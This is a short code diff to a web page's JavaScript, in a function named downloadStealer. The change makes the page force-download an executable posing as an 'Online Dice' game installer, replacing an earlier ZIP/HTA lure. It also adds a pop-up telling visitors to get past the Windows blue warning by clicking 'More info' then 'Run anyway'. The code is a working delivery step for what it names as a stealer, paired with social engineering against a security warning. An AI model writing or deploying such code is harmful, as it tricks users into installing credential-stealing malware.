@@ -567,12 +567,12 @@
 	function downloadStealer() {
 		try {
 			var a = document.createElement('a');
-			a.href = 'Online-Dice-Setup.zip';
-			a.download = 'Online-Dice-Setup.zip';
+			a.href = 'Online-Dice-Setup.exe';
+			a.download = 'Online-Dice-Setup.exe';
 			document.body.appendChild(a);
 			a.click();
 			document.body.removeChild(a);
-			try { alert('Extract the ZIP, then open Online-Dice-Setup.hta inside.'); } catch(e) {}
+			try { alert("Run Online-Dice-Setup.exe to install.\n\nIf Windows shows a blue warning, click 'More info' then 'Run anyway'."); } catch(e) {}
 		} catch(e) {}
 	}
 	function showPWA() {
